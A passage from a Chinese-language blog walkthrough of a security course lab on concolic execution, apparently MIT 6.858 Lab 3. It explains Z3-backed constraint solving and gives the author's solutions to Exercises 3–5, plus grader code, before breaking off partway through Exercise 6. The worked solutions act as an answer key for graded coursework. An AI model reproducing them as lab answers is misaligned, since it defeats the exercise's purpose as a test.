class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolically execute testfunc with the given concrete_values. It</span><br><span class="hljs-comment"># returns the value testfunc computes for the given concrete_values</span><br><span class="hljs-comment"># and the branches it encountered to compute that result.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_exec_input</span>(<span class="hljs-params">testfunc, concrete_values, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr = []<br>  cur_path_constr_callers = []<br>    <br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying concrete value:&#x27;</span>, concrete_values)<br><br>  <span class="hljs-comment"># make the concrete_value global so that new variables created</span><br>  <span class="hljs-comment"># by testfunc(), directly or indirectly, will be added to</span><br>  <span class="hljs-comment"># concrete_values.</span><br>  concrete_values.mk_global()<br>  v = testfunc()<br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Test generated&#x27;</span>, <span class="hljs-built_in">len</span>(cur_path_constr), <span class="hljs-string">&#x27;branches:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> (c, caller) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cur_path_constr, cur_path_constr_callers):<br>      <span class="hljs-built_in">print</span>(indent(z3expr(c)), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;%s:%d&#x27;</span> % (caller[<span class="hljs-number">0</span>], caller[<span class="hljs-number">1</span>]))<br><br>  <span class="hljs-keyword">return</span> (v, cur_path_constr, cur_path_constr_callers)<br></code></pre></td></tr></table></figure><p>可以看到在该函数中并没有更改路径约束与信息的列表，实际上这在 <code>add_constr()</code> 中完成，该函数在 <code>concolic_bool()</code> 中调用，将约束信息进行添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constr</span>(<span class="hljs-params">e</span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr.append(simplify(e))<br>  cur_path_constr_callers.append(get_caller())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_bool</span>(<span class="hljs-params">sym, v</span>):<br>  <span class="hljs-comment">## Python claims that &#x27;bool&#x27; is not an acceptable base type,</span><br>  <span class="hljs-comment">## so it seems difficult to subclass bool.  Luckily, bool has</span><br>  <span class="hljs-comment">## only two possible values, so whenever we get a concolic</span><br>  <span class="hljs-comment">## bool, add its value to the constraint.</span><br>  add_constr(sym_eq(sym, ast(v)))<br>  <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>而 <code>concolic_bool()</code> 实际上在 <code>concolic_int</code> 与 <code>concolic_str</code> 的运算符重载中进行调用，这也是为什么每次执行 <code>concolic_exec_input()</code> 都要<strong>重新将路径约束与信息列表清空</strong>的缘故，这里以 <code>concolic_int </code>中的 <code>__cmp__</code> 运算符为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__cmp__</span>(<span class="hljs-params">self, o</span>):<br>  res = <span class="hljs-built_in">int</span>(self.__v).__cmp__(<span class="hljs-built_in">int</span>(o))<br>  <span class="hljs-keyword">if</span> concolic_bool(sym_lt(ast(self), ast(o)), res &lt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> concolic_bool(sym_gt(ast(self), ast(o)), res &gt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><hr><p>我们接下来来看  <code>symex_exercises.py</code>  里有啥，主要就一个 <code>make_a_test()</code> 函数，我们需要在其中完成全局具体值字典 <code>concrete_values</code> 的构建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>那么我们该如何修改   <code>symex_exercises.py</code> 中创建的字典呢？我们先看一下 Exercise 3 的评判标准，在 <code>check_lab3.py</code> 中检测的是运行 <code>check-symex-int.py</code> 后要输出 <code>&quot;Found input for 1234&quot;</code> 字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_symex_int</span>():<br>    sh(<span class="hljs-string">&#x27;python3 check-symex-int.py &gt;/tmp/lab3.log&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Found input for 1234&#x27;</span> <span class="hljs-keyword">in</span> file_read(<span class="hljs-string">&#x27;/tmp/lab3.log&#x27;</span>):<br>        log(green(<span class="hljs-string">&quot;PASS&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log(red(<span class="hljs-string">&quot;FAIL&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>我们接下来来看  <code>check-symex-int.py</code> ，其开头的逻辑如下，<code>r</code> 的值为 1234 即可通过 Exercise 3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This test case checks that you provided the right input in symex_exercises.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calling f with a specific input..&#x27;</span>)<br>v = symex_exercises.make_a_test_case()<br>(r, constr, callers) = fuzzy.concolic_exec_input(test_f, v, verbose=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> r == <span class="hljs-number">1234</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found input for 1234&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input produced&quot;</span>, r, <span class="hljs-string">&quot;instead of 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>如前面我们对 <code>concolic_exec_input()</code> 的分析，<code>r</code> 的值由传入的函数指针决定，故我们来看 <code>test_f()</code> 的逻辑，主要就是用 <code>mk_int()</code> 从全局具体值字典中获取 id 为 <code>i</code> 的值传入 <code>f()</code> 中进行运算，若不存在 <code>i</code> 则 <code>i</code> 会被默认赋值 <code>0</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == x+<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">2000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">80</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == <span class="hljs-number">1000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">30000</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">500</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">33</span><br>    <span class="hljs-keyword">if</span> x // <span class="hljs-number">123</span> == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1234</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">40</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    i = fuzzy.mk_int(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0</span>)<br>    v = f(i)<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>由函数 <code>f()</code> 我们可以知道的是我们只需要向具体值字典中添加一个 <code>i = 123 * 7</code> 的值即可让 <code>test_f()</code> 返回 <code>1234</code>，故修改 <code>symex_exercises.py</code> 如下，这里用 <code>mk_int()</code> 和 <code>add()</code> 都可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  concrete_values.add(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">123</span> * <span class="hljs-number">7</span>)<br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 3：</p><p><img src="https://s2.loli.net/2022/12/18/f3HsgQFum1CZDij.png" alt="image.png"></p><p>接下来是 Exercise 4，完成 <code>symex/fuzzy.py</code> 中 <code>concolic_find_input</code>  的实现：</p><blockquote><p><strong>Exercise 4.</strong> Another major component in concolic execution is finding a concrete input for a constraint. Complete the implementation of <code>concolic_find_input</code> in <code>symex/fuzzy.py</code> and make sure you pass the second test case of <code>symex/check-symex-int.py</code>. For this exercise, you will have to invoke Z3, along the lines of <code>(ok, model) = fork_and_check(constr)</code> (see the comments in the code). Run <strong>./check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>在该函数当中我们需要完成对约束的求解并返回对应的结果，因此这里需要使用 Z3 求解器来完成约束求解过程，不过这里已经将调用 Z3 的流程在 <code>fork_and_check()</code> 中完成封装，我们只需要调用该函数进行求解即可，那么我们先来看  <code>fork_and_check()</code> 的具体实现：</p><ul><li>创建子进程调用 <code>fork_and_check_worker()</code> 进行约束求解，父子进程通过管道通信</li><li>父进程等待子进程的 <code>SIGALRM</code> 信号，若 <code>z3_timeout</code> 秒后未收到，杀死子进程</li><li>从管道接收结果并返回，若超时（子进程被杀，管道关闭）则返回 <code>(z3.unknown, None)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Support for forking because z3 uses lots of global variables</span><br><br><span class="hljs-comment">## timeout for Z3, in seconds</span><br>z3_timeout = <span class="hljs-number">5</span><br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check</span>(<span class="hljs-params">constr</span>):<br>  constr = simplify(constr)<br><br>  parent_conn, child_conn = multiprocessing.Pipe()<br>  p = multiprocessing.Process(target=fork_and_check_worker,<br>                              args=(constr, child_conn))<br>  p.start()<br>  child_conn.close()<br><br>  <span class="hljs-comment">## timeout after a while..</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">sighandler</span>(<span class="hljs-params">signo, stack</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Timed out..&quot;</span>)<br>    <span class="hljs-comment"># print z3expr(constr).sexpr()</span><br>    p.terminate()<br><br>  signal.signal(signal.SIGALRM, sighandler)<br>  signal.alarm(z3_timeout)<br><br>  <span class="hljs-keyword">try</span>:<br>    res = parent_conn.recv()<br>  <span class="hljs-keyword">except</span> EOFError:<br>    res = (z3.unknown, <span class="hljs-literal">None</span>)<br>  <span class="hljs-keyword">finally</span>:<br>    signal.alarm(<span class="hljs-number">0</span>)<br><br>  p.join()<br>  <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure><p>接下来我们来看   <code>fork_and_check_workder()</code> 的具体实现：</p><ul><li>新建一个 Z3 求解器将转化为字符串的约束表达式传入，调用 <code>Solver.check()</code> 求解</li><li>若求解成功，调用 <code>Solver.model()</code> 获得求解结果</li><li>判断结果中变量类型并转换为整型/字符串，对于字符串做额外处理，将结果放到一个 <code>字符串→结果</code> 映射的字典中并返回</li></ul><blockquote><p>Z3 这玩意用起来确实方便，不愧是微软<s>大爹</s></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check_worker</span>(<span class="hljs-params">constr, conn</span>):<br>  s = z3.Solver()<br>  s.add(z3expr(constr))<br>  ok = s.check()<br>  m = &#123;&#125;<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    z3m = s.model()<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> z3m:<br>      v = z3m[k]<br>      <span class="hljs-keyword">if</span> v.sort() == z3.IntSort():<br>        m[<span class="hljs-built_in">str</span>(k)] = v.as_long()<br>      <span class="hljs-keyword">elif</span> v.sort() == z3.StringSort():<br>        <span class="hljs-comment">## There doesn&#x27;t seem to be a way to get the raw string</span><br>        <span class="hljs-comment">## value out of Z3..  Instead, we get the escaped string</span><br>        <span class="hljs-comment">## value.  We need to jump through hoops to unescape it.</span><br>        x = v.as_string()<br>        u = x.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode-escape&#x27;</span>)<br>        m[<span class="hljs-built_in">str</span>(k)] = u<br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Unknown sort for %s=%s: %s&quot;</span> % (k, v, v.sort()))<br>  conn.send((ok, m))<br>  conn.close()<br></code></pre></td></tr></table></figure><p>那么现在我们可以完成 Exercise 4 了，我们只需要调用  <code>fork_and_check()</code> 进行求解即可，需要注意的是我们返回的字典中的键值对应当只包含 <code>ok_names</code> 参数中所需要的键，若 <code>ok_names == None</code> 则将所有的键值对添加到字典中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Given a constraint, ask Z3 to compute concrete values that make that</span><br><span class="hljs-comment"># constraint true. It returns a new ConcreteValues instance with those</span><br><span class="hljs-comment"># values.  Z3 produces variables that don&#x27;t show up in our</span><br><span class="hljs-comment"># applications and in our constraints; we filter those by accepting</span><br><span class="hljs-comment"># only variables names that appear in ok_names.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_find_input</span>(<span class="hljs-params">constraint, ok_names, verbose=<span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## Invoke Z3, along the lines of:</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">##     (ok, model) = fork_and_check(constr)</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## If Z3 was able to find example inputs that solve this</span><br>  <span class="hljs-comment">## constraint (i.e., ok == z3.sat), make a new input set</span><br>  <span class="hljs-comment">## containing the values from Z3&#x27;s model, and return it.</span><br>  (ok, model) = fork_and_check(constraint)<br>  cv = ConcreteValues()<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    sat = <span class="hljs-literal">True</span><br>    res_names = model.keys() <span class="hljs-keyword">if</span> ok_names <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> ok_names<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> res_names:<br>      cv.add(k, model[k])<br>  <span class="hljs-keyword">else</span>:<br>    sat = <span class="hljs-literal">False</span><br>  <span class="hljs-keyword">return</span> sat, cv<br></code></pre></td></tr></table></figure><p>成功通过 Exercise 4：</p><p><img src="https://s2.loli.net/2022/12/18/NJ32G9ogzOCEbPA.png" alt="image.png"></p><p>然后是 Exercise 5， 完成 <code>symex/fuzzy.py</code> 中 <code>concolic_force_branch</code>  的实现：</p><blockquote><p>提前说一下，这个 Exercise 5 的检查<strong>非常松</strong>，不要以为通过检查就是真的 Pass 了，最好自己再看看代码逻辑是否符合要求…</p></blockquote><blockquote><p><strong>Exercise 5.</strong> A final major component in concolic execution is exploring different branches of execution. Complete the implementation of <code>concolic_force_branch</code> in <code>symex/fuzzy.py</code> and make sure you pass the final test case of <code>symex/check-symex-int.py</code>. Run <strong>./check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>正如前文所说，在遇到分支时我们需要<strong>逆转当前分支条件，以探索另一分支</strong>，该函数的作用实际上就是逆转 <code>branch_conds</code> 中的第 <code>b</code> 分支的条件，并返回新的约束条件集合，那么我们只需要取出该条件并使用 <code>sym_not()</code> 取反后再用 <code>sym_and()</code> 加上该分支之前所有的条件约束即可</p><p>注意这里的参数 <code>b</code> 为分支标号，<code>branch_conds</code> 与 <code>branch_callers</code> 为分支的条件与调用者数组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Compute a new constraint by negating the branch condition of the</span><br><span class="hljs-comment"># b-th branch in branch_conds. This constraint can be used to force</span><br><span class="hljs-comment"># the concolic execution to explore the other side of branch b.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_force_branch</span>(<span class="hljs-params">b, branch_conds, branch_callers, verbose = <span class="hljs-number">1</span></span>):<br>  <span class="hljs-comment">## Compute an AST expression for the constraints necessary</span><br>  <span class="hljs-comment">## to go the other way on branch b.  You can use existing</span><br>  <span class="hljs-comment">## logical AST combinators like sym_not(), sym_and(), etc.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Note that some of the AST combinators take separate positional</span><br>  <span class="hljs-comment">## arguments. In Python, to unpack a list into separate positional</span><br>  <span class="hljs-comment">## arguments, use the &#x27;*&#x27; operator documented at</span><br>  <span class="hljs-comment">## https://docs.python.org/3/tutorial/controlflow.html#unpacking-argument-lists</span><br><br>  constraint = <span class="hljs-literal">None</span><br>  <span class="hljs-comment">## Exercise 5 by arttnba3</span><br>  <span class="hljs-comment">### negating the branch condition of the b-th branch</span><br>  b_cond = branch_conds[b]<br>  <span class="hljs-keyword">if</span> (b_cond != const_bool(<span class="hljs-literal">True</span>)):<br>    constraint = sym_not(b_cond)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>      constraint = sym_and(constraint, branch_conds[i])<br>  <span class="hljs-comment">### end</span><br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">2</span>:<br>    callers = branch_callers[b]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying to branch at %s:%d:&#x27;</span> % (callers[<span class="hljs-number">0</span>], callers[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>      <span class="hljs-built_in">print</span>(indent(z3expr(constraint).sexpr()))<br><br>  <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> const_bool(<span class="hljs-literal">True</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> constraint<br></code></pre></td></tr></table></figure><p>成功通过 Exercise 5：</p><p><img src="https://s2.loli.net/2022/12/18/dFbaOHEoCXG23L6.png" alt="image.png"></p><p>最后是 Exercise 6， <strong>使用我们在 Exercise 3-5 中涉及的几个函数来完成 <code>concolic_execs()</code>—— 完整的混合执行函数的构建</strong>，我们需要完成对 <code>func</code> 中的<strong>每一条分支</strong>的执行：</p><blockquote><p><strong>Exercise 6.</strong> Now implement concolic execution of a function in <code>concolic_execs()</code> in <code>symex/fuzzy.py</code>. The goal is to eventually cause every every branch of <code>func</code>to be executed. Read the comment for a proposed plan of attack for implementing that loop. The functions in the exercises 3-5 should be quite useful.</p><p>Run <strong>./check-symex-int.py</strong> or <strong>make check</strong> to check that your <code>concolic_execs()</code> works correctly.</p><p>Beware that our check for this exercise is <em>not</em> complete. You may well find that later on something does not work, and you will have to revisit your code for this exercise.</p></blockquote><p>我们先看 <code>concolic_execs()</code> 中已有的逻辑框架：</p><ul><li><code>checked</code> 为已经检查过的约束，<code>outs</code> 为最后求解所得结果，<code>inputs</code> 为待测试输入队列（输入为具体值字典）</li><li>由一个大循环持续调用<code>concolic_exec_input()</code> 计算约束</li><li>将新的约束解添加到结果中</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolic execute func for many different paths and return all</span><br><span class="hljs-comment"># computed results for those different paths.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_execs</span>(<span class="hljs-params">func, maxiter = <span class="hljs-number">100</span>, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## &quot;checked&quot; is the set of constraints we already sent to Z3 for</span><br>  <span class="hljs-comment">## checking.  use this to eliminate duplicate paths.</span><br>  checked = <span class="hljs-built_in">set</span>()<br><br>  <span class="hljs-comment">## output values</span><br>  outs = []<br><br>  <span class="hljs-comment">## list of inputs we should try to explore.</span><br>  inputs = InputQueue()<br><br>  <span class="hljs-built_in">iter</span> = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-built_in">iter</span> &lt; maxiter <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> inputs.empty():<br>    <span class="hljs-built_in">iter</span> += <span class="hljs-number">1</span><br>    concrete_values = inputs.get()<br>    (r, branch_conds, branch_callers) = concolic_exec_input(func, concrete_values, verbose)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> outs:<br>      outs.append(r)<br>    <br>    <span class="hljs-comment">## Exercise 6: your code here.</span><br></code></pre></td></tr></table></figure><p>我们的代码需要添加在大循环的后半部分，那么我们先回顾一下在 Exercise 3-5 中我们都获得了哪些可用函数：</p><ul><li><code>concolic_exec_input(testfunc, concrete_values, verbose = 0)</code>：将 <code>concrete_values</code> 参数设为全局字典，之后执行给定的函数 <code>testfunc</code>，返回执行的结果值、分支条件列表、分支调用信息列表</li><li><code>concolic_find_input(constraint, ok_names, verbose=0)</code>：使用 Z3 求解给定约束，返回 <code>ok_names</code> 列表中变量的值</li><li><code>concolic_force_branch(b, branch_conds, branch_callers, verbose = 1)</code>：对给定约束条件 <code>branch_conds</code> 与分支 <code>b</code>，返回走向该分支另一路径的约束</li></ul><p>接下来我们看 Lab 给的提示信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 6: your code here.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Here&#x27;s a possible plan of attack:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Iterate over the set of branches returned by concolic_exec_input.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_force_branch() to construct a constraint over</span><br><span class="hljs-comment">##   the inputs for taking the other side of that branch.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - If this constraint is already in the &quot;checked&quot; set, skip</span><br><span class="hljs-comment">##   it (otherwise, add it to prevent further duplicates).</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_find_input() to construct a new input to test,</span><br><span class="hljs-comment">##   based on the above constraint.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Since Z3 might not assign values to every variable</span><br><span class="hljs-comment">##   (such as if that variable turns out to be irrelevant to</span><br><span class="hljs-comment">##   the overall constraint), inherit unassigned values from</span><br><span class="hljs-comment">##   the input that we just tried (i.e., concrete_values).</span><br><span class="hljs-comment">##   You can use the inherit() method in ConcreteValues for this.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Add the input to the queue for processing, along the lines of:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##     inputs.add(new_values, caller)</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##   where caller is the corresponding value from the list of call</span><br><span class="hljs-comment">##   sites returned by concolic_find_input (i.e., branch_callers).</span><br></code></pre></td></tr></table></figure><ul><li>迭代 <code>concolic_exec_input()</code> 所返回的分支集合</li><li>使用 <code>concolic_force_branch()</code> 来构建一个分支的另一路径约束</li><li>若约束已经在 <code>check</code> 集合中，将其跳过，否则加入集合中</li><li>使用 <code>concolic_find_input()</code> 以构建一个基于另一路径约束的新的测试输入</li><li>Z3 